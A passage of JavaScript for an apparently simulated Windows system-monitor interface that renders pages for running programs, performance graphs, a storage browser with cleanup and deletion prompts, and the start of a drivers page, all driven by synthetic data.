    if (b) { b.textContent = n; b.hidden = !n; }
  }
  function set(k, v) { var el = $('[data-k="' + k + '"]'); if (el && el.textContent !== v) el.textContent = v; }
  function width(k, v) { var el = $('[data-k="' + k + '"]'); if (el) el.style.width = clamp(v, 0, 100).toFixed(1) + "%"; }

  var toastT;
  function toast(title, body, color) {
    var t = $('[data-k="toast"]');
    if (!t) return;
    t.querySelector("b").textContent = title;
    t.querySelector("p").textContent = body || "";
    t.style.setProperty("--c", color || "var(--s-accent)");
    t.classList.add("on");
    clearTimeout(toastT);
    toastT = setTimeout(function () { t.classList.remove("on"); }, 4200);
  }

  // ---------- pages ----------
  var PAGES = {};
  function go(page) {
    S.page = page;
    $$("[data-go]").forEach(function (b) { if (b.getAttribute("data-go") === page) b.setAttribute("aria-current", "page"); else b.removeAttribute("aria-current"); });
    var main = $('[data-k="main"]');
    main.innerHTML = PAGES[page].html();
    main.scrollTop = 0;
    if (PAGES[page].mount) PAGES[page].mount();
    PAGES[page].update();
  }
  function head(title, sub, acts) { return '<div class="sim-head"><div><h3>' + title + "</h3><p" + (typeof sub === "object" ? ' data-k="' + sub[0] + '">' + sub[1] : ">" + sub) + "</p></div>" + (acts ? '<div class="acts">' + acts + "</div>" : "") + "</div>"; }

  // ----- Programs -----
  function sumCard(k, label, color) {
    return '<div class="sim-card" style="--c:' + color + '"><div class="t"><i></i>' + label + '<span class="v" data-k="sv-' + k + '"></span></div>' + graph(color).replace('class="sim-graph ', 'data-k="sg-' + k + '" class="sim-graph ') +
      '<div class="who-cap">Biggest user</div><div class="who" data-k="sw-' + k + '"></div><div class="sub" data-k="ss-' + k + '"></div></div>';
  }
  var SORTS = { name: "Name", impact: "Impact", cpu: "CPU", mem: "Memory", gpu: "GPU", disk: "Disk" };
  PAGES.programs = {
    html: function () {
      return head("Running programs", ["phead", ""],
        '<label class="sim-search">' + ic("search") + '<input type="search" placeholder="Find a program" aria-label="Find a program" data-k="q" value="' + esc(S.q) + '"></label>' +
        '<button type="button" class="sim-tog" data-act="hideidle" aria-pressed="' + S.hideIdle + '"><span class="sim-sw"></span>Hide idle</button>' +
        '<button type="button" class="sim-btn" data-act="sortnow">' + ic("sort") + "Sort now</button>" +
        '<button type="button" class="sim-btn" data-act="freeze" aria-pressed="' + S.frozen + '">' + ic(S.frozen ? "play" : "pause") + "<span>" + (S.frozen ? "Resume" : "Freeze order") + "</span></button>") +
        '<div class="sim-sum">' + sumCard("cpu", "CPU", "#5b9dff") + sumCard("mem", "Memory", "#b18cff") + sumCard("gpu", "GPU", "#3dd68c") + sumCard("disk", "Disk", "#ffb547") + "</div>" +
        '<div class="sim-tbl"><div class="sim-th"><div class="nm"><button type="button" data-sort="name">Name</button><span class="st" data-k="pstatus"></span></div>' +
        ["impact", "cpu", "mem", "gpu", "disk"].map(function (k) { return '<button type="button" class="' + (k === "impact" ? "imp c-imp" : k === "gpu" ? "c-gpu" : k === "disk" ? "c-disk" : "") + '" data-sort="' + k + '">' + SORTS[k] + "</button>"; }).join("") + "<span></span></div>" +
        '<div class="sim-grp">Apps <b data-k="napps"></b></div><div class="sim-rows" data-k="rows-apps"></div>' +
        '<div class="sim-grp" data-k="bggrp">Running in the background <b data-k="nbg"></b></div><div class="sim-rows" data-k="rows-bg"></div>' +
        '<div class="sim-hidden-note" data-k="hidden"></div><div class="sim-empty" data-k="nores" hidden>No programs match “<span data-k="qq"></span>”.</div></div>';
    },
    mount: function () {
      var list = $(".sim-tbl");
      list.addEventListener("mouseenter", function () { S.hover = true; statusText(); });
      list.addEventListener("mouseleave", function () { S.hover = false; statusText(); });
      $('[data-k="q"]').addEventListener("input", function (e) { S.q = e.target.value.trim(); syncRows(true); });
      syncRows(true);
    },
    update: function () {
      syncRows(false);
      var live = apps.filter(function (a) { return !a.ended && (!a.helper || S.helpers); });
      function top(f) { return live.reduce(function (b, a) { return !b || f(a) > f(b) ? a : b; }, null); }
      var memP = sys.mem * 100 / MEM_TOTAL, mine = live.reduce(function (t, a) { return t + a.m; }, 0);
      card("cpu", pct(sys.cpu), hist.cpu, 100, top(function (a) { return a.c; }), function (a) { return pct(a.c); }, "Your programs " + sys.share + "%  ·  Windows " + (100 - sys.share) + "%");
      card("mem", Math.round(memP) + "%", hist.mem, 100, top(function (a) { return a.m; }), function (a) { return mb(a.m); }, mb(sys.mem) + " of " + mb(MEM_TOTAL) + " used  ·  yours " + mb(mine));
      card("gpu", pct(sys.gpu), hist.gpu, 100, top(function (a) { return a.g; }), function (a) { return pct(a.g); }, GPU_MODEL);
      card("disk", pct(sys.dc), hist.dc, 30, top(function (a) { return a.d; }), function (a) { return rate(a.d); }, "Read " + rate(sys.read) + "  ·  Write " + rate(sys.write));
      if (!S.frozen && !S.hover && S.reorder > 0 && S.sinceSort >= S.reorder) { S.sinceSort = 0; order(true); }
    }
  };
  function card(k, v, arr, max, who, fmt, sub) {
    set("sv-" + k, v);
    plot($('[data-k="sg-' + k + '"]'), arr, max);
    var w = $('[data-k="sw-' + k + '"]');
    if (w) {
      var key = who ? who.id + fmt(who) : "";
      if (w.getAttribute("data-key") !== key) { w.setAttribute("data-key", key); w.innerHTML = who ? img(who.icon) + "<span>" + esc(who.name) + "</span><b>" + fmt(who) + "</b>" : "<span>—</span>"; }
    }
    set("ss-" + k, sub);
  }
  function statusText() {
    var n = SORTS[S.sort] === "Impact" ? "overall impact" : S.sort === "name" ? "name" : SORTS[S.sort];
    var t = S.frozen ? "Sorted by " + n + "  ·  order frozen" : S.hover ? "Sorted by " + n + "  ·  holding still while your mouse is on the list" : S.reorder <= 0 ? "Sorted by " + n + "  ·  re-sorts only when you click Sort now" : "Sorted by " + n + "  ·  re-sorts gently every " + S.reorder + "s";
    set("pstatus", t);
  }
  function wants(a) {
    if (a.ended) return false;
    if (a.helper && !S.helpers) return false;
    if (S.q) { var q = S.q.toLowerCase(); return (a.name + " " + a.exe + " " + (a.co || "")).toLowerCase().indexOf(q) >= 0; }
    if (S.open[a.id] || a.win || !S.hideIdle) return true;
    return a.busy < 20;
  }
  function score(a) { return S.sort === "cpu" ? a.rc : S.sort === "mem" ? a.m / 100 : S.sort === "gpu" ? a.rg : S.sort === "disk" ? a.rd : a.rk; }
  function above(a, b) {
    if (S.sort === "name") return a.name.localeCompare(b.name) < 0;
    var sa = score(a), sb = score(b);
    if (Math.abs(sa - sb) <= Math.max(.4, .12 * Math.max(sa, sb))) return (a.pos || 0) < (b.pos || 0);
    return sa > sb;
  }
  function sorted(list) {
    var out = [];
    list.forEach(function (a) { var i = 0; while (i < out.length && !above(a, out[i])) i++; out.splice(i, 0, a); });
    return out;
  }
  function rowHtml(a) {
    return '<div class="sim-row" data-id="' + a.id + '"><div class="sim-row-top" data-act="toggle" role="button" tabindex="0" aria-expanded="false">' +
      '<div class="sim-app">' + img(a.icon) + "<div><b>" + esc(a.name) + "</b><small>" + esc(a.n > 1 ? a.n + " processes" : a.co || a.exe) + "</small></div></div>" +
      '<div class="c-imp"><span class="sim-pill" data-f="imp"><i></i><span></span></span></div>' +
      '<div class="sim-cell" data-f="cpu"></div><div class="sim-cell" data-f="mem"></div><div class="sim-cell c-gpu" data-f="gpu"></div><div class="sim-cell c-disk" data-f="disk"></div>' +
      '<button type="button" class="sim-btn small danger sim-end" data-act="end">End task</button></div><div class="sim-det" data-f="det"></div></div>';
  }
  function detHtml(a) {
    var pids = []; for (var i = 0; i < Math.min(a.n, 8); i++) pids.push(a.pid + i * 4);
    var started = new Date(Date.now() - a.min * 60000);
    return "<dl><dt>Location</dt><dd>" + esc(a.path) + "</dd><dt>Publisher</dt><dd>" + esc((a.co ? a.co + "  ·  " : "") + (a.self ? "Not signed (a small independent app)" : "Signed and verified")) + "</dd>" +
      "<dt>Processes</dt><dd>" + a.n + (a.n === 1 ? " process" : " processes") + "  ·  PID " + pids.join(", ") + (a.n > 8 ? " +" + (a.n - 8) + " more" : "") + "</dd>" +
      "<dt>Running for</dt><dd>" + dur(a.min) + "  ·  started " + clock(started) + "</dd>" +
      '<dt>Memory</dt><dd data-f="dmem"></dd><dt>GPU</dt><dd data-f="dgpu"></dd>' +
      '<dt>Command line</dt><dd class="s-mono">"' + esc(a.path) + '"' + (a.id === "firefox" ? " -contentproc --channel=11248" : "") + "</dd></dl>" +
      '<div class="acts"><button type="button" class="sim-btn small" data-act="demo" data-msg="Opens ' + esc(a.path.replace(/\\[^\\]+$/, "")) + ' in File Explorer.">' + ic("folder") + "Open file location</button>" +
      '<button type="button" class="sim-btn small" data-act="demo" data-msg="Searches the web for “' + esc(a.exe) + ' what is this process”.">' + ic("search") + "What is this?</button>" +
      '<button type="button" class="sim-btn small" data-act="copypath" data-path="' + esc(a.path) + '">' + ic("copy") + "Copy path</button>" +
      (a.n > 1 ? '<button type="button" class="sim-btn small danger" data-act="endtree">End it and everything it started</button>' : "") + "</div>";
  }
  function syncRows(force) {
    var groups = { apps: $('[data-k="rows-apps"]'), bg: $('[data-k="rows-bg"]') };
    if (!groups.apps) return;
    var vis = apps.filter(wants), hidden = apps.filter(function (a) { return !a.ended && (!a.helper || S.helpers) && !wants(a) && !S.q; }).length;
    var have = {};
    $$(".sim-row", root).forEach(function (el) { have[el.getAttribute("data-id")] = el; });
    var visIds = {};
    vis.forEach(function (a) { visIds[a.id] = true; });
    Object.keys(have).forEach(function (id) { var a = byId(id); if (!visIds[id] && !(a && a.closing)) { have[id].remove(); delete have[id]; } });
    var added = false;
    vis.forEach(function (a) {
      if (!have[a.id]) {
        var wrap = document.createElement("div"); wrap.innerHTML = rowHtml(a);
        var el = wrap.firstChild; a.pos = 999; (a.win ? groups.apps : groups.bg).appendChild(el); have[a.id] = el; added = true;
        if (S.open[a.id]) openRow(a, el, true);
      }
      fillRow(a, have[a.id]);
    });
    if (force || added) order(false);
    var nApps = vis.filter(function (a) { return a.win; }).length, nBg = vis.length - nApps;
    set("napps", String(nApps)); set("nbg", String(nBg));
    set("phead", nApps + (nApps === 1 ? " app" : " apps") + " and " + nBg + " background " + (nBg === 1 ? "program" : "programs") + " you can close");
    var hn = $('[data-k="hidden"]');
    if (hn) {
      var html = hidden && S.hideIdle ? hidden + " idle background " + (hidden === 1 ? "item" : "items") + ' hidden  ·  <button type="button" data-act="showidle">Show</button>' : "";
      if (hn.innerHTML !== html) hn.innerHTML = html;
    }
    var nr = $('[data-k="nores"]'); if (nr) { nr.hidden = vis.length > 0; set("qq", S.q); }
    $$(".sim-th [data-sort]").forEach(function (b) { var on = b.getAttribute("data-sort") === S.sort; b.classList.toggle("on", on); b.textContent = SORTS[b.getAttribute("data-sort")] + (on ? (S.sort === "name" ? " ↑" : " ↓") : ""); });
    statusText();
  }
  function fillRow(a, el) {
    if (a.closing) return;
    var lv = IMPACT[level(a.rk)], pill = el.querySelector('[data-f="imp"]');
    pill.style.color = lv[1]; pill.style.background = lv[2]; pill.lastChild.textContent = lv[0];
    cell(el, "cpu", pct(a.c), heat(a.c / 40)); cell(el, "mem", mb(a.m), heat(a.m * 100 / MEM_TOTAL / 20)); cell(el, "gpu", pct(a.g), heat(a.g / 50)); cell(el, "disk", rate(a.d), heat(a.d / 30));
    if (S.open[a.id]) {
      var dm = el.querySelector('[data-f="dmem"]'), dg = el.querySelector('[data-f="dgpu"]');
      if (dm) dm.textContent = mb(a.m) + " private  ·  " + mb(a.m * 1.35) + " in RAM including shared";
      if (dg) dg.textContent = pct(a.g) + (a.g > 1 ? "  ·  " + mb(a.g * 60) + " video memory" : "");
    }
  }
  function cell(el, f, txt, bg) { var c = el.querySelector('[data-f="' + f + '"]'); if (c.textContent !== txt) c.textContent = txt; c.style.background = bg; }
  function byId(id) { for (var i = 0; i < apps.length; i++) if (apps[i].id === id) return apps[i]; return null; }
  function order(animate) {
    [["apps", true], ["bg", false]].forEach(function (g) {
      var box = $('[data-k="rows-' + g[0] + '"]');
      if (!box) return;
      var els = $$(".sim-row", box), before = {};
      els.forEach(function (el) { before[el.getAttribute("data-id")] = el.offsetTop; });
      var list = sorted(els.map(function (el) { return byId(el.getAttribute("data-id")); }).filter(Boolean));
      list.forEach(function (a, i) { a.pos = i; box.appendChild(box.querySelector('[data-id="' + a.id + '"]')); });
      if (!animate || reduce) return;
      list.forEach(function (a) {
        var el = box.querySelector('[data-id="' + a.id + '"]'), dy = before[a.id] - el.offsetTop;
        if (!dy) return;
        el.style.transition = "none"; el.style.transform = "translateY(" + dy + "px)";
        el.offsetHeight; // apply the starting offset before animating back
        el.style.transition = "transform 360ms ease-out, background-color 200ms ease-out"; el.style.transform = "";
      });
    });
  }
  function openRow(a, el, on) {
    S.open[a.id] = on;
    el.classList.toggle("open", on);
    el.querySelector(".sim-row-top").setAttribute("aria-expanded", on);
    var det = el.querySelector('[data-f="det"]');
    if (on) { det.innerHTML = detHtml(a); fillRow(a, el); } else det.innerHTML = "";
  }
  function endApp(a, el, btn, tree) {
    if (a.self) { toast("That's this window", "Steady won't end itself from its own list. Try another app.", "var(--s-info)"); return; }
    if (!tree && !btn.classList.contains("confirm")) {
      btn.classList.add("confirm"); btn.textContent = "Confirm";
      clearTimeout(btn._t); btn._t = setTimeout(function () { btn.classList.remove("confirm"); btn.textContent = "End task"; }, 3500);
      return;
    }
    clearTimeout(btn._t);
    a.closing = true; btn.classList.remove("confirm"); btn.textContent = "Ending…"; btn.disabled = true;
    later(function () {
      a.ended = true; el.classList.add("gone"); btn.textContent = "Closed";
      ["cpu", "gpu", "disk"].forEach(function (f) { var c = el.querySelector('[data-f="' + f + '"]'); c.textContent = "–"; c.style.background = "transparent"; });
      toast("Ended " + a.name, tree ? "It and the " + (a.n - 1) + " processes it started are closed." : "It's closed. Anything unsaved in it is gone, like in Task Manager.", "var(--s-ok)");
      later(function () { a.closing = false; delete S.open[a.id]; el.remove(); syncRows(false); }, 1300);
    }, 450);
  }

  // ----- Performance -----
  PAGES.performance = {
    html: function () {
      var cores = ""; for (var i = 0; i < 16; i++) cores += '<div class="sim-core"><span data-k="core' + i + '"></span>' + graph("#5b9dff").replace('class="sim-graph ', 'data-k="cg' + i + '" class="sim-graph ') + "</div>";
      function tile(k, title, sub, color, big, extra) {
        return '<div class="sim-card" style="--c:' + color + '"><span class="big" data-k="pb-' + k + '"></span><div class="t"><i></i>' + title + "</div><small" + (sub ? ">" + sub : ' data-k="ps-' + k + '">') + "</small>" +
          graph(color).replace('class="sim-graph ', 'data-k="pg-' + k + '" class="sim-graph ') + extra + "</div>";
      }
      return head("Performance", "How hard your PC is working right now. Graphs show the last 60 seconds.") +
        '<div class="sim-perf"><div class="sim-card wide" style="--c:#5b9dff"><div><span class="big" data-k="pb-cpu"></span><div class="t"><i></i>CPU</div><small>' + CPU_MODEL + "</small>" +
        graph("#5b9dff").replace('class="sim-graph ', 'data-k="pg-cpu" class="sim-graph ') +
        '<div class="sim-stats"><div>Speed<b data-k="st-speed"></b></div><div>Processes<b>286</b></div><div>Threads<b data-k="st-thr"></b></div><div>Handles<b data-k="st-hnd"></b></div><div>Up time<b data-k="st-up"></b></div></div></div>' +
        '<div><div class="sim-cores-cap">Each core / thread</div><div class="sim-cores">' + cores + "</div></div></div>" +
        tile("mem", "Memory", null, "#b18cff", true, '<div class="sim-stats"><div>Available<b data-k="st-avail"></b></div><div>Cached<b>9.60 GB</b></div><div>Committed<b data-k="st-com"></b></div></div><small class="sim-vram-note" style="display:block;margin-top:10px;color:var(--s-faint)" data-k="st-memnote"></small>') +
        tile("gpu", "GPU", GPU_MODEL, "#3dd68c", true, '<div class="sim-vram"><div><span>Video memory</span><b data-k="st-vram"></b></div><div class="sim-bar" style="--c:var(--s-gpu)"><i data-k="st-vramb"></i></div></div><small>Shared memory in use: 410 MB</small>') +
        tile("dc", "Disk 0  (C:)", "Samsung SSD 990 PRO 2TB", "#ffb547", true, '<div class="sim-stats"><div>Read<b data-k="st-rc"></b></div><div>Write<b data-k="st-wc"></b></div></div>') +
        tile("dd", "Disk 1  (D:)", "WD_BLACK SN770 1TB", "#ffb547", true, '<div class="sim-stats"><div>Read<b data-k="st-rd"></b></div><div>Write<b>0 MB/s</b></div></div>') +
        '<div class="sim-card" style="--c:#ff7ab8"><div class="t"><i></i>Network</div><small>Realtek Gaming 2.5GbE  ·  2.5 Gbps</small>' +
        '<svg class="sim-graph" data-k="pg-net" viewBox="0 0 100 40" preserveAspectRatio="none" aria-hidden="true" style="height:120px;margin:22px 0 16px"><line class="grid" x1="0" x2="100" y1="13.3" y2="13.3"/><line class="grid" x1="0" x2="100" y1="26.6" y2="26.6"/><path class="ln" stroke="#ff7ab8"/><path class="ln" stroke="#7adfff"/></svg>' +
        '<div class="sim-net-key"><span><i style="background:#ff7ab8"></i>Down <b data-k="st-down"></b></span><span><i style="background:#7adfff"></i>Up <b data-k="st-upr"></b></span></div></div></div>';
    },
    update: function () {
      var memP = sys.mem * 100 / MEM_TOTAL;
      set("pb-cpu", pct(sys.cpu)); plot($('[data-k="pg-cpu"]'), hist.cpu, 100);
      for (var i = 0; i < 16; i++) { set("core" + i, Math.round(sys.cores[i]) + "%"); plot($('[data-k="cg' + i + '"]'), hist.cores[i], 100); }
      set("st-speed", (sys.mhz / 1000).toFixed(2) + " GHz"); set("st-thr", (4112 + Math.round(sys.nz * 40)).toLocaleString("en-US")); set("st-hnd", (151830 + Math.round(sys.nz * 300)).toLocaleString("en-US"));
      var u = Math.floor(sys.uptime), hh = Math.floor(u / 3600), mm = Math.floor(u / 60) % 60, ss = u % 60;
      set("st-up", "0:" + (hh < 10 ? "0" : "") + hh + ":" + (mm < 10 ? "0" : "") + mm + ":" + (ss < 10 ? "0" : "") + ss);
      set("pb-mem", mb(sys.mem)); set("ps-mem", "of " + mb(MEM_TOTAL) + "  ·  " + Math.round(memP) + "%"); plot($('[data-k="pg-mem"]'), hist.mem, 100);
      set("st-avail", mb(MEM_TOTAL - sys.mem)); set("st-com", mb(sys.mem * 1.41) + " / 36.8 GB"); set("st-memnote", memP >= 90 ? "Running low — close something big" : memP >= 75 ? "Getting full" : "Plenty free");
      set("pb-gpu", pct(sys.gpu)); plot($('[data-k="pg-gpu"]'), hist.gpu, 100);
      var vram = 5.2 + sys.gpu / 100 * .6; set("st-vram", vram.toFixed(2) + " GB / 12.0 GB"); width("st-vramb", vram / 12 * 100);
      set("pb-dc", pct(sys.dc)); plot($('[data-k="pg-dc"]'), hist.dc, 30); set("st-rc", rate(sys.read)); set("st-wc", rate(sys.write));
      set("pb-dd", pct(sys.dd)); plot($('[data-k="pg-dd"]'), hist.dd, 30); set("st-rd", rate(sys.dd * .3));
      line2($('[data-k="pg-net"]'), hist.down, hist.up, 6); set("st-down", mbps(sys.down)); set("st-upr", mbps(sys.up));
    }
  };

  // ----- Storage -----
  function drive() { return drives[S.drive]; }
  function used(d) { return size(d.root) + d.held; }
  function bin() { return drives.C.held + drives.D.held; }
  function nodeById(id, x) { x = x || drive().root; if (x.id === id) return x; for (var i = 0; x.kids && i < x.kids.length; i++) { var r = nodeById(id, x.kids[i]); if (r) return r; } return null; }
  function cur() { var d = drive(), n = d.root; d.path.forEach(function (name) { var k = (n.kids || []).filter(function (c) { return c.n === name && !c.gone; })[0]; if (k) n = k; }); return n; }
  var NOTES = {
    game: function (n) { return ["lock", "A Steam game. Uninstall it in Steam so your library stays correct."]; },
    gamefile: function (n) { return ["lock", "Part of the Steam game “" + n.game + "”. Deleting single files breaks the game — uninstall the whole game instead."]; },
    sys: function (n) { return ["lock", n.why]; },
    virt: function (n) { return ["lock", n.why]; },
    pf: function () { return ["warn", "Inside Program Files — deleting can break the app it belongs to. Uninstalling the app is safer."]; },
    pfdir: function () { return ["warn", "Installed programs. Uninstall apps instead of deleting their folders."]; },
    steamlib: function () { return ["lock", "Steam's game library. Uninstall games in Steam instead of deleting folders."]; },
    userroot: function () { return ["warn", "Your user folders. Delete things inside it, not the folder itself."]; },
    temp: function () { return ["info", "Temporary files. Safe to clear — use Clean up above."]; },
    tempdir: function () { return ["info", "Windows' temp folder. Clean up above clears what's safe."]; },
    cache: function () { return ["info", "A cache. The app rebuilds it, so it's safe to delete."]; },
    appdata: function () { return ["warn", "App settings and data. Deleting it can reset or break those apps."]; }
  };
  function canDelete(n) { return n.k === "file" || n.k === "cache" || n.k === "folder" || n.k === "dir"; }
  function itemHtml(n, total, max, path) {
    var openable = !!n.kids, folderish = openable || n.many || n.k === "folder";
    var note = NOTES[n.k] ? NOTES[n.k](n) : null;
    var sub = path != null ? path : openable ? countFiles(n) : n.m != null ? "Modified " + modDate(n.m) : folderish ? Math.round(900 + n.s * 37).toLocaleString("en-US") + " files" : "";
    var dup = n.dup ? (n.dup.indexOf(".") > -1 ? "Possible duplicate of \u201c" + n.dup + "\u201d \u2014 same size" : "Possible duplicate \u2014 same name and size in C:\\Users\\you\\" + n.dup) : "";
    var share = total ? n.s * 100 / total : 0;
    var act = "";
    if (n.k === "game") act = '<button type="button" class="sim-btn small" data-act="uninstall" data-n="' + esc(n.game) + '">Uninstall in Steam</button>';
    else if (n.k === "gamefile") act = '<button type="button" class="sim-btn small" data-act="uninstall" data-n="' + esc(n.game) + '">Uninstall in Steam</button>';
    else if (n.k === "pf" || n.k === "pfdir") act = '<button type="button" class="sim-btn small" data-act="demo" data-msg="Opens Settings › Apps › Installed apps, where uninstalling is safe.">Installed apps</button>';
    else if (n.k === "temp" || n.k === "tempdir") act = '<button type="button" class="sim-btn small" data-act="cleantemp">Clean up</button>';
    else if (canDelete(n)) act = '<button type="button" class="sim-btn small danger" data-act="del" data-id="' + n.id + '">Delete</button>';
    return '<div class="sim-item"><span class="ic' + (folderish ? " folder" : "") + '">' + ic(folderish ? "folder" : "file") + "</span>" +
      '<div class="nm"><b' + (openable ? ' class="link" data-act="open" data-n="' + esc(n.n) + '" role="button" tabindex="0"' : "") + ">" + esc(n.n) + "</b><small>" + esc(sub) + "</small>" +
      (dup ? '<div class="dup">' + esc(dup) + "</div>" : "") +
      (note ? '<div class="s-note ' + (note[0] === "warn" ? "warn" : "") + '">' + ic(note[0]) + "<span>" + esc(note[1]) + "</span></div>" : "") + "</div>" +
      '<div class="barc"><div class="s-bar"><i style="width:' + (max ? clamp(n.s / max * 100, 1, 100) : 0).toFixed(1) + '%"></i></div></div>' +
      '<div class="sz">' + gb(n.s) + (share >= .1 ? "<small>" + (share >= 1 ? Math.round(share) : share.toFixed(1)) + "%</small>" : "") + "</div>" +
      '<div class="s-act">' + act + "</div></div>";
  }
  function modDate(days) { var d = new Date(Date.now() - days * 86400000); return d.toLocaleDateString("en-US", { month: "short", day: "numeric" }) + (days > 300 ? ", " + d.getFullYear() : ""); }
  function countFiles(n) { var c = 0; (function walk(x) { (x.kids || []).forEach(function (k) { if (k.gone) return; if (k.kids) walk(k); else c += k.many ? 900 + Math.round(k.s * 37) : 1; }); })(n); return c.toLocaleString("en-US") + (c === 1 ? " file" : " files"); }
  PAGES.storage = {
    html: function () {
      return head("Storage", ["shint", ""], '<button type="button" class="sim-tog" data-act="perm" aria-pressed="' + S.perm + '"><span class="sim-sw"></span>Skip Recycle Bin</button><button type="button" class="sim-btn" data-act="rescan">' + ic("sync") + "Rescan</button>") +
        '<div class="sim-drives" data-k="drives"></div>' +
        '<div class="sim-card sim-quick"><div class="sim-qw">' + ic("trash") + '<div><b>Recycle Bin</b><small data-k="qbin"></small></div></div><button type="button" class="sim-btn small" data-act="emptybin" data-k="qbinb">Empty</button>' +
        '<div class="sim-qw">' + ic("file") + '<div><b>Temporary files</b><small data-k="qtmp"></small></div></div><button type="button" class="sim-btn small" data-act="cleantemp" data-k="qtmpb">Clean up</button>' +
        '<div class="sim-qw">' + ic("down") + '<div><b>Downloads</b><small data-k="qdl"></small></div></div><button type="button" class="sim-btn small" data-act="showdl">Show</button>' +
        '<button type="button" class="sim-link" data-act="demo" data-msg="Opens Windows Settings › System › Storage.">More in Windows Storage settings</button></div>' +
        '<div data-k="listarea"></div>';
    },
    mount: function () { if (!S.scanned[S.drive]) scan(S.drive); else renderList(); },
    update: function () { renderDrives(); }
  };
  function renderDrives() {
    var box = $('[data-k="drives"]');
    if (!box) return;
    var html = ["C", "D"].map(function (k) {
      var d = drives[k], u = used(d), free = d.total - u, f = u / d.total;
      return '<button type="button" class="sim-drive' + (S.drive === k ? " on" : "") + '" data-act="drive" data-d="' + k + '"><div class="r">' + ic("disk") + "<b>" + k + ":</b><span>" + d.label + (d.sys ? "  ·  Windows" : "") + "</span><em>" + gb(free) + ' free</em></div><div class="sim-bar" style="--c:' + (f >= .9 ? "var(--s-danger)" : "var(--s-accent)") + '"><i style="width:' + (f * 100).toFixed(1) + '%"></i></div><small>' + gb(u) + " used of " + gb(d.total) + "</small></button>";
    }).join("");
    if (box.innerHTML !== html) box.innerHTML = html;
    var tmp = tempNode();
    set("qbin", bin() > 0 ? gb(bin()) + "  ·  " + S.binItems.toLocaleString("en-US") + " items" : "Empty");
    set("qtmp", gb(tmp ? tmp.s : 0)); set("qdl", gb(dlNode().s));
    var bb = $('[data-k="qbinb"]'); if (bb && !bb.classList.contains("confirm")) bb.disabled = bin() <= 0;
    var tb = $('[data-k="qtmpb"]'); if (tb && !tb.classList.contains("confirm")) tb.disabled = !tmp || tmp.s < .2;
  }
  function find(path, rootNode) { var n = rootNode; path.forEach(function (p) { n = (n.kids || []).filter(function (c) { return c.n === p; })[0] || n; }); return n; }
  function tempNode() { return find(["Users", "you", "AppData", "Local", "Temp", "Temporary files"], drives.C.root); }
  function dlNode() { var n = find(["Users", "you", "Downloads"], drives.C.root); size(n); return n; }
  function scan(k) {
    S.scanning = k;
    var area = $('[data-k="listarea"]'), d = drives[k], total = used(d), t0 = Date.now(), dur = reduce ? 200 : 1600;
    set("shint", "Looking through " + k + ":…");
    if (area) area.innerHTML = '<div class="sim-card sim-scan"><div data-k="scant">Scanning ' + k + ":</div><div class=\"sim-bar\" style=\"--c:var(--s-accent)\"><i data-k=\"scanb\" style=\"width:0\"></i></div></div>";
    (function tickScan() {
      if (S.page !== "storage" || S.scanning !== k) return;
      var f = Math.min(1, (Date.now() - t0) / dur), e = 1 - Math.pow(1 - f, 2);
      set("scant", "Scanning " + k + ":  ·  " + Math.round(e * (k === "C" ? 1284316 : 412870)).toLocaleString("en-US") + " files  ·  " + gb(total * e) + " so far");
      width("scanb", e * 100);
      if (f < 1) later(tickScan, 60);
      else { S.scanned[k] = true; S.scanning = null; renderList(); }
    })();
  }
  function renderList() {
    var area = $('[data-k="listarea"]');
    if (!area || S.scanning) return;
    var d = drive(), n = cur();
    size(d.root);
    set("shint", "Scanned " + (S.drive === "C" ? "1,284,316" : "412,870") + " files in " + (S.drive === "C" ? "4.9" : "1.7") + "s. Click a folder to look inside.");
    var title, sub, rows = "";
    if (S.view === "files") {
      var all = files(d.root, S.drive + ":", []).sort(function (a, b) { return b.node.s - a.node.s; }).slice(0, 14);
      var tot = all.reduce(function (t, f) { return t + f.node.s; }, 0);
      title = "Biggest files on " + S.drive + ":"; sub = all.length + " files bigger than 64 MB  ·  " + gb(tot) + " in total";
      rows = all.map(function (f) { return itemHtml(f.node, 0, all[0].node.s, f.path); }).join("");
    } else {
      var kids = (n.kids || []).filter(function (c) { return !c.gone; }).sort(function (a, b) { return b.s - a.s; });
      title = d.path.length ? n.n : S.drive + ":  " + d.label; sub = gb(n.s) + "  ·  " + countFiles(n);
      rows = kids.map(function (c) { return itemHtml(c, n.s, kids[0] ? kids[0].s : 1, null); }).join("");
    }
    var crumbs = S.view === "folders" && d.path.length ? '<div class="sim-crumbs"><button type="button" data-act="crumb" data-i="0">' + S.drive + ":</button>" + d.path.map(function (p, i) { return "<span>›</span>" + (i === d.path.length - 1 ? "<span>" + esc(p) + "</span>" : '<button type="button" data-act="crumb" data-i="' + (i + 1) + '">' + esc(p) + "</button>"); }).join("") + "</div>" : "";
    area.innerHTML = '<div class="sim-folderbar"><button type="button" class="sim-up" data-act="up" aria-label="Up one folder"' + (S.view === "files" || !d.path.length ? " disabled" : "") + ">" + ic("up") + "</button><h4>" + esc(title) + "</h4><small>" + esc(sub) + "</small>" +
      '<div class="sim-seg" role="group" aria-label="View"><button type="button" data-act="view" data-v="folders" aria-pressed="' + (S.view === "folders") + '">Folders</button><button type="button" data-act="view" data-v="files" aria-pressed="' + (S.view === "files") + '">Biggest files</button></div></div>' +
      crumbs + '<div class="sim-items">' + rows + "</div>";
  }
  function confirmBtn(btn, label, run) {
    if (!btn.classList.contains("confirm")) {
      btn.classList.add("confirm"); var was = btn.textContent; btn.textContent = label;
      clearTimeout(btn._t); btn._t = setTimeout(function () { btn.classList.remove("confirm"); btn.textContent = was; }, 3500);
      return;
    }
    clearTimeout(btn._t); btn.classList.remove("confirm"); run();
  }

  // ----- Drivers -----
  var STATUS = { upd: ["Update available", "var(--s-warn)", "rgba(245,165,36,.13)"], maker: ["Check maker", "var(--s-info)", "rgba(91,157,255,.13)"], ok2: ["Looks current", "var(--s-ok)", "rgba(61,214,140,.13)"], ok: ["Up to date", "var(--s-ok)", "rgba(61,214,140,.13)"], withgpu: ["Update with GPU", "var(--s-warn)", "rgba(245,165,36,.13)"], busy: ["Installing…", "var(--s-info)", "rgba(91,157,255,.13)"], done: ["Updated", "var(--s-ok)", "rgba(61,214,140,.13)"] };
  PAGES.drivers = {
    html: function () {
      return head("Drivers", "Your main components, the driver each one is running, and the newest version available.", '<button type="button" class="sim-btn" data-act="demo" data-msg="Opens Windows Update › Optional updates.">' + ic("sync") + 'Open Windows Update</button><button type="button" class="sim-btn primary" data-act="drvcheck">' + ic("sync") + "Check again</button>") +
        '<div class="sim-card sim-status" data-k="dstat"></div><div class="sim-card sim-drv"><div class="sim-drv-h"><span>Component</span><span>You have</span><span>Newest available</span><span>Status</span><span></span></div><div data-k="drows"></div></div>';
    },
